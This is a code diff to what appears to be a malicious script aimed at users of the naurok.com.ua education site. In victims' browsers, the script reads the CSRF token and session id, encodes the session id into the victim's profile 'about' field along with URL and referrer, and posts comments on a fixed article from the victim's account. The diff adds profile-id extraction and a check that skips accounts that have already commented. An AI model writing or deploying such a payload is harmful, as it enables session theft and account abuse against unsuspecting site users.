@@ -22,13 +22,16 @@
     const csrf = match[1];
     if (!csrf) return console.log('no csrf 2');
 
+    const o = text.match(/<a href=".profile.(.+)">Особиста/);
+    const profileId = parseInt(o[1]);
+
     const promises = [];
 
     async function updateProfile () {
         const preferences = await fetch('https://naurok.com.ua/preferences');
         const html = await preferences.text();
 
-        const about = html.match(/<textarea id="accountpreferences-about" class="form-control" name="AccountPreferences.about.+">(.*)<.textarea>/s)[1] + '\n' + url + '\n' + referrer;
+        const about = html.match(/<textarea id="accountpreferences-about" class="form-control" name="AccountPreferences.about.+">(.*)<.textarea>/s)[1] + '\nu: ' + url + '\nr: ' + referrer;
         
         const text = encode(sessid);
         await fetch("https://naurok.com.ua/preferences", {
@@ -55,6 +58,7 @@
         const commentP = await fetch('https://naurok.com.ua/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya');
     
         const text2 = await commentP.text();
+        if (text2.includes(`href="/profile/${profileId}"`)) return console.log('already commented');
         const m = text2.match(/form id="comment-form" class="comment-box" action="\/comment\/default\/create\?entity=(.+)" method="post"/);
         if (!m) return;
         const e = m[1];
